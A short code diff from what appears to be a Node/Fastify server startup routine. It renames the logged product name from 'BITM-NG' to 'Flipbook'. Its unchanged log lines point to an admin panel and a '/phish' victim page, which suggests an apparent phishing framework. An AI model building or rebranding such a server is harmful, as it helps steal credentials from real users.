@@ -131,7 +131,7 @@ async function main(): Promise<void> {
   const host = process.env['HOST'] ?? '0.0.0.0';
 
   await fastify.listen({ port, host });
-  console.log(`\n[server] BITM-NG running at http://${host}:${port}`);
+  console.log(`\n[server] Flipbook running at http://${host}:${port}`);
   console.log(`[server] Admin panel: http://localhost:${port}/admin`);
   console.log(`[server] Victim page: http://localhost:${port}/phish\n`);
 
